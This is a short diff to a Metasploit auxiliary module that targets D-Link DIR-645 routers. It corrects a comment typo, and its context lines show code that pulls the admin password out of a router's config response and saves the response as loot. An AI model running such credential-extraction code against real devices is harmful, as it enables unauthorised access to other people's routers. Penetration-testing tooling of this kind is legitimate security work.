@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
       if res.body =~ %r{<password>(.*)</password>}
         print_good("#{rhost}:#{rport} - credentials successfully extracted")
 
-        # store all details as loot -> there is some usefull stuff in the response
+        # store all details as loot -> there is some useful stuff in the response
         loot = store_loot('dlink.dir645.config', 'text/plain', rhost, res.body)
         print_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")
 
